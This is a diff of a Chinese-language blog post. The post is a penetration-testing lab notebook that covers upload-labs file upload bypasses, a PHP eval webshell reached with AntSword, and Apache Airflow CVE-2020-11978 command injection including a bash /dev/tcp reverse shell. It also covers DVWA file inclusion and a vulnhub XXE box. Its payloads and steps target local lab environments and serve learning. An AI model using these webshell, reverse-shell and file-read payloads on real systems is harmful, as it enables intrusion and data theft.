-<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><h4 id="方法一-禁用js"><a href="#方法一-禁用js" class="headerlink" title="方法一 禁用js"></a>方法一 禁用js</h4><h4 id="方法二-抓包"><a href="#方法二-抓包" class="headerlink" title="方法二 抓包"></a>方法二 抓包</h4><p><img src="F:\blog\source\_posts\漏洞part\212.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/198.png" alt></p>
+<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><h4 id="方法一-禁用js"><a href="#方法一-禁用js" class="headerlink" title="方法一 禁用js"></a>方法一 禁用js</h4><h4 id="方法二-抓包"><a href="#方法二-抓包" class="headerlink" title="方法二 抓包"></a>方法二 抓包</h4><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/212.png" alt></p>
 <p>将后缀名改为允许的jpg，选择改文件，打开抓包，点击上传，发现被BP拦截到了：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\213.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/213.png" alt></p>
 <p>将后缀改为php后发包，关闭抓包，回到页面，发现其上传成功：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\214.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\215.png" alt="215"></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/214.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/215.png" alt></p>
 <p>能够执行php代码，说明被解析成功</p>
 <h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>网站是用php写的，将后缀名改为.php才有利用价值，因为网页虽然可以上传.png图片，但是不会对其解析，仅为图片，无法对其利用</p>
 <p>先上传php脚本文件：1.php，出现提示文件类型不正确，故查看源码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\216.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/216.png" alt></p>
 <p>发现其对后端检测，设置了可利用的几种文件type，故抓包进行参数修改：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\217.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/217.png" alt></p>
 <p>将Content-Type改为网页所允许的image/jpeg，再发包，关闭抓包，发现上传成功，第二关绕过：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\218.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/218.png" alt></p>
 <h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>先上传1.php，发现提示：不允许上传.asp .aspx .php .jsp后缀文件（为黑名单），查看源代码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\219.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/219.png" alt></p>
 <p>（非黑即白）通过php文件别名绕过（能被当为php脚本语言上传且执行）</p>
 <p>“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.php1”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.pHp1”</p>
 <p>依然在windows上操作，后缀名改为.php3，但是发现文件能被上传但不解析，故用kali上搭建的试试：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\220.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/220.png" alt></p>
 <h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>针对windows特性——平台Windows</p>
 <p>查看源码，发现.htaccess没有被过滤</p>
-<p><img src="F:\blog\source\_posts\漏洞part\361.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/361.png" alt></p>
 <p>找到利用点：</p>
-<h3 id="延申-1"><a href="#延申-1" class="headerlink" title="延申"></a>延申</h3><p>通过webshell一句话木马获取服务器权限</p>
-<p><img src="F:\blog\source\_posts\漏洞part\199.png" alt=""></p>
+<h3 id="延申"><a href="#延申" class="headerlink" title="延申"></a>延申</h3><p>通过webshell一句话木马获取服务器权限</p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/199.png" alt></p>
 <p>在此使用php一句话木马进行测试：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span> [<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="F:\blog\source\_posts\漏洞part\200.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/200.png" alt></p>
 <p>借助第一关做测试：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\201.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/201.png" alt></p>
 <p>说明网站对上传的后缀进行检测，想办法绕过</p>
 <p>点开提示：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\202.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/202.png" alt></p>
 <p>js即前端检测，则绕过前端检测：禁用js</p>
-<p><img src="F:\blog\source\_posts\漏洞part\203.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/203.png" alt></p>
 <p>再次上传，即可成功</p>
-<p><img src="F:\blog\source\_posts\漏洞part\204.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\207.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\205.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\206.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/204.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/207.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/205.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/206.png" alt></p>
 <p>得到地址，因所写代码执行，故看不到东西。接着用蚁剑去连接：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\208.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/208.png" alt></p>
 <p>右键——&gt;添加数据：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\209.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/209.png" alt></p>
 <p>点击“测试链接”，连接成功后，双击便可进入：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\210.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/210.png" alt></p>
 <p>可以增删查改，不管服务器在哪，可以下载文件、上传新的木马等等，也可右键—&gt;获取到主机的终端：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\211.png" alt=""></p>
-<h1 id="命令执行-代码执行"><a href="#命令执行-代码执行" class="headerlink" title="命令执行/代码执行"></a>命令执行/代码执行</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p><img src="F:\blog\source\_posts\漏洞part\221.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/211.png" alt></p>
+<h1 id="命令执行-代码执行"><a href="#命令执行-代码执行" class="headerlink" title="命令执行/代码执行"></a>命令执行/代码执行</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/221.png" alt></p>
 <p>为什么存在代码执行：在代码中使用evel之类的敏感函数</p>
-<p><img src="F:\blog\source\_posts\漏洞part\222.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/222.png" alt></p>
 <p>代码执行漏洞发现：利用代码审计工具Seay</p>
-<p><img src="F:\blog\source\_posts\漏洞part\223.png" alt=""></p>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><img src="F:\blog\source\_posts\漏洞part\224.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\225.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/223.png" alt></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/224.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/225.png" alt></p>
 <p>漏洞成因：代码层过滤不严格、系统漏洞</p>
-<p><img src="F:\blog\source\_posts\漏洞part\227.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/227.png" alt></p>
 <p>Linux系统命令区分大小写</p>
-<p><img src="F:\blog\source\_posts\漏洞part\226.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/226.png" alt></p>
 <p>whoami也常用于查看权限</p>
 <p>查看文件的四个命令：head看前、tail看后、more看长文件用空格翻页</p>
 <h3 id="Apache-Airflow-CVE-2020-11978"><a href="#Apache-Airflow-CVE-2020-11978" class="headerlink" title="Apache Airflow(CVE-2020-11978)"></a>Apache Airflow(CVE-2020-11978)</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Airflow 是一个使用 python 语言编写的 data pipeline 调度和监控工作流的平台。Airflow 是通过 DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具， 不需要知道业务数据的具体内容，设置任务的依赖关系即可实现任务调度。</p>
 <p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞（影响版本Apache Airflow &lt;= 1.10.10），未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p>
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="启动vulhub靶场环境"><a href="#启动vulhub靶场环境" class="headerlink" title="启动vulhub靶场环境"></a>启动vulhub靶场环境</h5><p>进入CVE-2020-11978文件夹：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\228.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/228.png" alt></p>
 <p>在该处打开终端，输入命令启动：</p>
 <p>sudo docker-compose run airflow-init</p>
 <p>sudo docker-compose up -d</p>
-<p><img src="F:\blog\source\_posts\漏洞part\229.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/229.png" alt></p>
 <p>查看是否启动成功，并且获得端口号：</p>
 <p>sudo docker ps</p>
-<p><img src="F:\blog\source\_posts\漏洞part\230.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/230.png" alt></p>
 <p>接着在浏览器访问，即可进入环境（airflow管理端）</p>
 <p>127.0.0.1:端口号</p>
-<p><img src="F:\blog\source\_posts\漏洞part\231.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/231.png" alt></p>
 <h5 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h5><p>将example_trigger_target_dag前面的Off改为On：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\232.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/232.png" alt></p>
 <p>点击进入example_trigger_target_dag页面，再点击Trigger DAG，进入到调试页面：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\233.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/233.png" alt></p>
 <p>在Configuration JSON中输入{“message”:”‘\”;touch /tmp/airflow_dag_success;#”}：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\234.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/234.png" alt></p>
 <p>再点击Trigger执行dag，等几秒可以看到显示成success，说明执行成功：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\235.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\236.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/235.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/236.png" alt></p>
 <p>进入容器查看目录，发现成功创建/tmp/airflow_dag_success文件，漏洞复现成功：</p>
 <p>sudo docker-compose exec airflow-worker bash</p>
-<p><img src="F:\blog\source\_posts\漏洞part\237.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/237.png" alt></p>
 <h5 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h5><p>上面能用touch创建文件，继续尝试反弹一个shell。</p>
 <p>首先进行在windows环境下nc(netcat)的安装：</p>
 <ul>
 <li>Win10</li>
 <li>netcat-win32-1.12</li>
 </ul>
-<p><img src="F:\blog\source\_posts\漏洞part\258.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/258.png" alt></p>
 <p>点击下载，解压到到c盘 users/当前登录用户目录下，并配置环境变量到Path。利用攻击机192.168.223.130开启nc，监听9999端口：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\259.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/259.png" alt></p>
 <p>在Configuration JSON中输入：</p>
 <p>{“message”:”‘\”;bash -i &gt;&amp; /dev/tcp/192.168.223.130/9999 0&gt;&1;#”}</p>
 <p>点击Trigger执行dag</p>
-<p><img src="F:\blog\source\_posts\漏洞part\260.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/260.png" alt></p>
 <p>成功反弹shell，便可以命令执行了。</p>
-<p><img src="F:\blog\source\_posts\漏洞part\261.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/261.png" alt></p>
 <p>用完之后，以免占用内存，先将其停止再删除或sudo docker-compose down</p>
 <p> 停止相关镜像：</p>
 <p>docker stop [CONTAINER ID]</p>
 <p> 删除指定镜像：</p>
 <p>docker rmi -f [IMAGE ID]</p>
 <h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><p>1、升级到1.10.10之后版本<br>2、删除或禁用默认DAG（可自行删除或在配置文件中禁用默认DAGload_examples=False）</p>
-<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="F:\blog\source\_posts\漏洞part\257.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\238.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\239.png" alt=""></p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/257.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\238.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/239.png" alt></p>
 <p>require()找不到包含文件，该函数会报错；include()不报错，产生警告；有once()参数的文件中的代码只能包含一次。</p>
-<p><img src="F:\blog\source\_posts\漏洞part\240.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\241.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/240.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/241.png" alt></p>
 <h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>原理：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\263.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/263.png" alt></p>
 <p>进入靶场，其默认为include.php文件</p>
-<p><img src="F:\blog\source\_posts\漏洞part\262.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/262.png" alt></p>
 <p>新建一个phpinfo.txt，先写入一句不完整的代码，然后去包含phpinfo.txt：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\264.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\265.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/264.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/265.png" alt></p>
 <p>因代码不符合php规范，故所写的值发现显示在页面上。修改代码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\266.png" style="zoom:80%;" /></p>
-<p><img src="F:\blog\source\_posts\漏洞part\267.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/266.png" style="zoom:80%;"></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/267.png" alt></p>
 <p>因文件包含漏洞，代码被执行（.txt）【无论什么后缀都能当成php执行】</p>
 <p>一般利用该漏洞去读取敏感文件：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\271.png" style="zoom:80%;" /></p>
-<p><img src="F:\blog\source\_posts\漏洞part\273.png" style="zoom:80%;" /></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/271.png" style="zoom:80%;"></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/273.png" style="zoom:80%;"></p>
 <p>?page=file://C:\Windows\win.ini</p>
-<p><img src="F:\blog\source\_posts\漏洞part\268.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/268.png" alt></p>
 <p>若用该方式无法读取源码，则进行转化，读base64编码：</p>
 <p>?page=php://filter/convert.base64-encode/resource=C:\phpstudy_pro\WWW\DVWA\vulnerabilities\fi\source\low.php</p>
-<p><img src="F:\blog\source\_posts\漏洞part\269.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/269.png" alt></p>
 <p>利用BP解码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\270.png" alt=""></p>
-<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p><img src="F:\blog\source\_posts\漏洞part\272.png" style="zoom:80%;" /></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/270.png" alt></p>
+<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/272.png" style="zoom:80%;"></p>
 <p>按照如上代码新建in.php文件：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\274.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/274.png" alt></p>
 <p>也在相同目录下新建phpinfo.php文件：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\275.png" alt=""></p>
-<h1 id="xxe外部实体注入漏洞"><a href="#xxe外部实体注入漏洞" class="headerlink" title="xxe外部实体注入漏洞"></a>xxe外部实体注入漏洞</h1><p><img src="F:\blog\source\_posts\漏洞part\276.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\277.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/275.png" alt></p>
+<h1 id="xxe外部实体注入漏洞"><a href="#xxe外部实体注入漏洞" class="headerlink" title="xxe外部实体注入漏洞"></a>xxe外部实体注入漏洞</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/276.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/277.png" alt></p>
 <p>XML用于传输信息，说明与数据库存在交互，在此基础上便可以利用</p>
-<p><img src="F:\blog\source\_posts\漏洞part\278.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/278.png" alt></p>
 <p>XML标签对大小写敏感</p>
-<p><img src="F:\blog\source\_posts\漏洞part\279.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\280.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/279.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/280.png" alt></p>
 <p>危害：可以用于文件读取</p>
 <h2 id="渗透vulnhub-XXE（靶机一）"><a href="#渗透vulnhub-XXE（靶机一）" class="headerlink" title="渗透vulnhub-XXE（靶机一）"></a>渗透vulnhub-XXE（靶机一）</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>有回显：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p>
 <p>把下载好的压缩包解压到D盘，迅雷下载中。进入XEE文件夹，右键选择xxe.ovf—&gt;打开方式—&gt;VMware，存储在D盘中</p>
-<p><img src="F:\blog\source\_posts\漏洞part\281.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/281.png" alt></p>
 <p>导入后便可以打开虚拟机，并且打开虚拟网络编辑器（虚拟机的左上角 编辑 –-&gt;网络虚拟编辑器）设置nat模式，便可以开始使用了</p>
-<p><img src="F:\blog\source\_posts\漏洞part\285.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/285.png" alt></p>
 <h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h5 id="利用nmap扫描获取ip"><a href="#利用nmap扫描获取ip" class="headerlink" title="利用nmap扫描获取ip"></a>利用nmap扫描获取ip</h5><p>首先要知道网段，查看kali设置，确认为NAT模式</p>
-<p><img src="F:\blog\source\_posts\漏洞part\286.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/286.png" alt></p>
 <p>便可以在网络虚拟编辑器查看，发现是223网段</p>
-<p><img src="F:\blog\source\_posts\漏洞part\287.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/287.png" alt></p>
 <p>打开kali在桌面开启终端扫描223网段：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\288.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/288.png" alt></p>
 <p>128是本机，故确认为131，且其80端口开放，尝试用windows10访问</p>
-<p><img src="F:\blog\source\_posts\漏洞part\289.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/289.png" alt></p>
 <p>看到页面不知道要做什么。</p>
-<h5 id="利用nmap看是否存活"><a href="#利用nmap看是否存活" class="headerlink" title="利用nmap看是否存活"></a>利用nmap看是否存活</h5><p><img src="F:\blog\source\_posts\漏洞part\290.png" alt=""></p>
+<h5 id="利用nmap看是否存活"><a href="#利用nmap看是否存活" class="headerlink" title="利用nmap看是否存活"></a>利用nmap看是否存活</h5><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/290.png" alt></p>
 <h5 id="利用nmap扫描端口"><a href="#利用nmap扫描端口" class="headerlink" title="利用nmap扫描端口"></a>利用nmap扫描端口</h5><p>若不写-p则扫描默认端口；故可以用-p指定端口（如果是全端口扫描则共有65535个）</p>
 <p>nmap -p 1-65535 192.168.223.0/24</p>
 <h5 id="利用dirb扫描目录"><a href="#利用dirb扫描目录" class="headerlink" title="利用dirb扫描目录"></a>利用dirb扫描目录</h5><p>dirb <a target="_blank" rel="noopener" href="http://192.168.223.131">http://192.168.223.131</a></p>
 <p>其原理是通过字典进行扫描</p>
 <p>根据扫描结果中返回的状态码（code）进行判断【主要看2-；404：资源不存在，不需要看；3-说明可能存在跳转】【若无2-、3-，可以尝试利用403，403说明无权访问资源，可以想办法绕过】【200说明服务器成功返回网页】</p>
-<p><img src="F:\blog\source\_posts\漏洞part\291.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/291.png" alt></p>
 <p>同样用windows10访问：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\292.png" alt="">发现有xxe，不是因为字典没有，是因为其写在Disallow（不被发现)，故通过扫描工具是扫描不到该路径的，尝试访问xxe：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\293.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/292.png" alt>发现有xxe，不是因为字典没有，是因为其写在Disallow（不被发现)，故通过扫描工具是扫描不到该路径的，尝试访问xxe：</p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/293.png" alt></p>
 <p>出现了不一样的页面【正常情况下看到登录框，想到弱口令、万能密码、sql注入，尝试是否可以登录到后台】</p>
 <p>因前面出现了xxe该处直接进行测试即可</p>
 <h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>接下来探测xxe，用BP抓包：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\294.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/294.png" alt></p>
 <p>首先，发现标签为XML样式，说明可能存在xxe漏洞</p>
 <p>若没有红框这句话，也可以通过&lt;&gt;做出初步判断【因登录框处，一般是写为uname=admin&amp;passwd=12321&amp;submit，而此处出现了标签，形式不一样】</p>
 <p>进一步的，发送到Repeater将Content-Type中的text/plain修改为text/xml，Send后看其是否支持接受</p>
-<p><img src="F:\blog\source\_posts\漏洞part\295.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/295.png" alt></p>
 <p>发现返回200，说明支持。找到xee漏洞后，便可以进行利用。</p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在Repeater中将攻击代码输入进行文件etc/passwd读取，点击Send：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\296.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/296.png" alt></p>
 <p>在攻击代码中，admin出现的两处可以修改，一致即可。其中攻击代码越少越好，只要能达到攻击目的就行。【这样，溯源研判时提取到的信息就越少，不易暴露】</p>
 <p>读取到了，至此靶场做完。</p>
-<h3 id="延申-2"><a href="#延申-2" class="headerlink" title="延申"></a>延申</h3><h4 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h4><p>刚刚在robots.txt中Disallow里面还发现了admin.php，在浏览器中克隆一个标签页进行访问，发现还有一个登录框：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\297.png" alt=""></p>
+<h3 id="延申-1"><a href="#延申-1" class="headerlink" title="延申"></a>延申</h3><h4 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h4><p>刚刚在robots.txt中Disallow里面还发现了admin.php，在浏览器中克隆一个标签页进行访问，发现还有一个登录框：</p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/297.png" alt></p>
 <p>想获取用户名和密码，还是通过源码审计admin.php。读源码要通过base64编码读取admin.php的源码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\298.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/298.png" alt></p>
 <p>选中，Send to Decoder，将其放到解码器中去，利用base64解码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\299.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/299.png" alt></p>
 <p>复制到记事本中查看源码，此时还不知道需要找什么。发现源码中出现了username和password：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\300.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/300.png" alt></p>
 <p>其中pw需要md5解密</p>
 <p>www.cmd5.com</p>
-<p><img src="F:\blog\source\_posts\漏洞part\301.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/301.png" alt></p>
 <p>由此得到账号密码后便尝试登录，登录成功：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\302.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/302.png" alt></p>
 <p>点击flag但是找不到：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\303.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/303.png" alt></p>
 <p>之前没扫出来flagmeout.php文件，正也说明了找不到</p>
 <p>flagmeout.php藏在xee中，flag又藏在源代码中：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\306.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/306.png" alt></p>
 <p>查看页面源代码得到flag</p>
-<p><img src="F:\blog\source\_posts\漏洞part\307.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/307.png" alt></p>
 <h4 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h4><p>或者使用另一种方法</p>
 <p>源码中显示直接跳转到flagmeout.php中，于是可以获得读文件的权限，直接读取，不需要用户名与密码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\308.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\309.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/308.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/309.png" alt></p>
